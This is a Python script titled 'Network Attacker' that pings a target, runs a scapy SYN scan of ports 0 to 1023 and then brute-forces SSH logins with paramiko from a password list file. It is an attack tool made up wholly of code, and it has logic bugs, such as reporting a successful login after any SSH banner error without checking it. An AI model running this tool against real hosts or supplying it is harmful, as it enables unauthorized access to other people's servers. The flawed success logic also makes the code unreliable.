from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko

registered_Ports = list(range(1024))

open_ports = []

def scanport(ports, target):

    for port in ports:
        status = 0
        source_port = RandShort()
        p = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=1, verbose=0)
        conf.verb = 0

        if (p != None):
            if (p.haslayer(TCP) == True):
                if (p.getlayer(TCP).flags == 0x12):
                    send_rst = sr(IP(dst=target) / TCP(sport=source_port, dport=ports, flags="R"), timeout=1, verbose=0)
                    print(f"Port {port} is open!")
                    status == True
                    open_ports.append(port)
                if (p.getlayer(TCP).flags == 0x14):
                    print(f"Port {port} is close!")
                    status == False
            else: print("problem")
        else: print("Synchronization Packet is not exist")

        if port == 1024:
            print("Scan is finish")
            print(open_ports)


    print("Scan is finish")
    print(open_ports)
    if 22 in open_ports:
        ans = input("Port 22 is open, Do you want buteforce? yes/no")
        if ans == "yes":
            bruteForce(target)

def target_availability(target):
    try:
        conf.verb = 0
        send_icmp = sr1(IP(dst=target)/ICMP(), timeout=1)
        if send_icmp != None:
            print(f"{target} is available")
        if send_icmp == None:
            print(f"{target} is not available")
    except:
        status = False
        print("Availability not check")

def bruteForce(target):
    port = input("Insert port: ")
    username = input("User to bruteforce ssh: ")
    with open('PasswordList.txt') as passwords:
        passwd = passwords.read().split("\n")


    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy)


    for password in passwd:
        print(f"Try: {username}:{password}")
        try:
            SSHconn.connect(target, port, username, password, timeout=1)
            print("[+] Success")
            print(f"Success login with user {username} and password {password}")
            SSHconn.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[-] Wrong password")

        except paramiko.ssh_exception.SSHException:
            print("Baner problem")
            time.sleep(5)
            SSHconn.connect(target, port, username, password, timeout=1)
            print("[+] Success")
            print(f"Success login with user {username} and password {password}")
            SSHconn.close()

print("Welcome in Network Attacker ")
target = input("Insert target IP: ")
while True:

    print("[+] Target availability -- 1")
    print("[+] Scan port -- 2")
    print("[+] Bruteforce ssh  -3")
    print("[-] exit -- 4")

    option = input("Choose option: ")
    if option == "1":
        target_availability(target)
    elif option == "2":
        scanport(registered_Ports, target)
    elif option == "3":
        bruteForce(target)
    elif option == "4":
        break
